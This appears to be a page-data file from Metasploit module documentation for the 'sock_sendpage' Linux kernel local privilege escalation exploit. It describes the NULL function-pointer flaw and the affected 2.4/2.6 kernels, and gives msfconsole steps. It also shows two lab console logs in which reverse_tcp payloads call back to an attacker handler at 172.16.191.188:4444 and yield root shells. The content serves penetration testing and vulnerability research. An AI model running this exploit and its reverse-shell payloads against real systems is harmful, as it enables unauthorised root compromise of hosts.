{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/local/sock_sendpage","result":{"data":{"moduleMetadataJson":{"id":"3b6062a2-3462-5d66-b1cc-36a49835b7cd","name":"Linux Kernel Sendpage Local Privilege Escalation","fullname":"exploit/linux/local/sock_sendpage","description":"The Linux kernel failed to properly initialize some entries in the\n        proto_ops struct for several protocols, leading to NULL being\n        dereferenced and used as a function pointer. By using mmap(2) to map\n        page 0, an attacker can execute arbitrary code in the context of the\n        kernel.\n\n        Several public exploits exist for this vulnerability, including\n        spender's wunderbar_emporium and rcvalle's ppc port, sock_sendpage.c.\n\n        All Linux 2.4/2.6 versions since May 2001 are believed to be affected:\n        2.4.4 up to and including 2.4.37.4; 2.6.0 up to and including 2.6.30.4\n\n        This module has been tested successfully on CentOS 5.0 (i386) with\n        kernel version 2.6.18-8.1.1.tl5; and Debian 3.1r8 Sarge (i686) with\n        kernel version 2.4.27-3-386.","rank":500,"fields":{"detailsSlug":"/modules/details/exploit/linux/local/sock_sendpage","documentationSlug":"/modules/documentation/exploit/linux/local/sock_sendpage"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>  The Linux kernel failed to properly initialize some entries in the\n<code class=\"language-text\">proto_ops</code> struct for several protocols, leading to <code class=\"language-text\">NULL</code> being\ndereferenced and used as a function pointer. By using <code class=\"language-text\">mmap(2)</code> to map\npage <code class=\"language-text\">0</code>, an attacker can execute arbitrary code in the context of the\nkernel.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  Several public exploits exist for this vulnerability, including\nspender's <code class=\"language-text\">wunderbar_emporium</code> and rcvalle's ppc port, <code class=\"language-text\">sock_sendpage.c</code>.</p>\n<p>  All Linux 2.4/2.6 versions since May 2001 are believed to be affected:</p>\n<ul>\n<li>2.4.4 up to and including 2.4.37.4</li>\n<li>2.6.0 up to and including 2.6.30.4</li>\n</ul>\n<p>  This module has been tested successfully on:</p>\n<ul>\n<li>CentOS 5.0 (i386) with kernel version 2.6.18-8.1.1.tl5</li>\n<li>Debian 3.1r8 Sarge (i686) with kernel version 2.4.27-3-386</li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Get a session</li>\n<li><code class=\"language-text\">use exploit/linux/local/sock_sendpage</code></li>\n<li><code class=\"language-text\">set SESSION [SESSION]</code></li>\n<li><code class=\"language-text\">check</code></li>\n<li><code class=\"language-text\">run</code></li>\n<li>You should get a new <em>root</em> session</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>SESSION</strong></p>\n<p>  Which session to use, which can be viewed with <code class=\"language-text\">sessions</code></p>\n<p>  <strong>WritableDir</strong></p>\n<p>  A writable directory file system path. (default: <code class=\"language-text\">/tmp</code>)</p>\n<p>  <strong>DEBUG_EXPLOIT</strong></p>\n<p>  Enable exploit debug messages. (default: <code class=\"language-text\">false</code>)</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"centos-50-i386-with-kernel-version-2618-811tl5\" style=\"position:relative;\"><a href=\"#centos-50-i386-with-kernel-version-2618-811tl5\" aria-label=\"centos 50 i386 with kernel version 2618 811tl5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>CentOS 5.0 (i386) with kernel version 2.6.18-8.1.1.tl5</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/linux/local/sock_sendpage \nmsf exploit(linux/local/sock_sendpage) &gt; set session 1\nsession =&gt; 1\nmsf exploit(linux/local/sock_sendpage) &gt; set verbose true\nverbose =&gt; true\nmsf exploit(linux/local/sock_sendpage) &gt; set payload linux/x86/meterpreter/reverse_tcp\npayload =&gt; linux/x86/meterpreter/reverse_tcp\nmsf exploit(linux/local/sock_sendpage) &gt; run\n\n[!] SESSION may not be compatible with this module.\n[*] Started reverse TCP handler on 172.16.191.188:4444 \n[+] Kernel version 2.6.18 appears to be vulnerable\n[+] System architecture i686 is supported\n[+] vm.mmap_min_addr is not set\n[*] Writing &#39;/tmp/.MCpzrCREnMXU&#39; (3509 bytes) ...\n[*] Max line length is 65537\n[*] Writing 3509 bytes in 1 chunks of 10560 bytes (octal-encoded), using printf\n[*] Executing payload...\n[*] Transmitting intermediate stager...(106 bytes)\n[*] Sending stage (857352 bytes) to 172.16.191.159\n[*] Meterpreter session 34 opened (172.16.191.188:4444 -&gt; 172.16.191.159:37663) at 2018-04-10 06:50:13 -0400\n\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0\nmeterpreter &gt; sysinfo\nComputer     : 172.16.191.159\nOS           : CentOS 5 (Linux 2.6.18-8.1.1.tl5)\nArchitecture : i686\nBuildTuple   : i486-linux-musl\nMeterpreter  : x86/linux</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"debian-31r8-sarge-i686-with-kernel-version-2427-3-386\" style=\"position:relative;\"><a href=\"#debian-31r8-sarge-i686-with-kernel-version-2427-3-386\" aria-label=\"debian 31r8 sarge i686 with kernel version 2427 3 386 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Debian 3.1r8 Sarge (i686) with kernel version 2.4.27-3-386</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/linux/local/sock_sendpage \nmsf exploit(linux/local/sock_sendpage) &gt; set payload linux/x86/shell/reverse_tcp\npayload =&gt; linux/x86/shell/reverse_tcp\nmsf exploit(linux/local/sock_sendpage) &gt; set session 1\nsession =&gt; 1\nmsf exploit(linux/local/sock_sendpage) &gt; run\n\n[!] SESSION may not be compatible with this module.\n[*] Started reverse TCP handler on 172.16.191.188:4444 \n[+] Kernel version 2.4.27 appears to be vulnerable\n[+] System architecture i686 is supported\n[+] vm.mmap_min_addr is not set\n[*] Writing &#39;/tmp/.69p3FeagB&#39; (3509 bytes) ...\n[*] Max line length is 65537\n[*] Writing 3509 bytes in 1 chunks of 10560 bytes (octal-encoded), using printf\n[*] Executing payload...\n[*] Sending stage (36 bytes) to 172.16.191.227\n[*] Command shell session 35 opened (172.16.191.188:4444 -&gt; 172.16.191.227:32836) at 2018-04-10 06:59:08 -0400\n[!] Tried to delete /tmp/.69p3FeagB, unknown result\n\n3356110123\nlfvaliLFShnAfRQkCHUXFtuyGXKylJSN\nTJloQpOJsrsnQSfZpNAjWcbqNuHanLeI\nLeKIAUjwBMRhxjJjVvvrdvwErYZnxPYr\nid\nuid=0(root) gid=0(root) groups=100(users)\nuname -a\nLinux sarge 2.4.27-3-386 #1 Wed Dec 6 00:38:33 UTC 2006 i686 GNU/Linux</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"3b6062a2-3462-5d66-b1cc-36a49835b7cd"}}}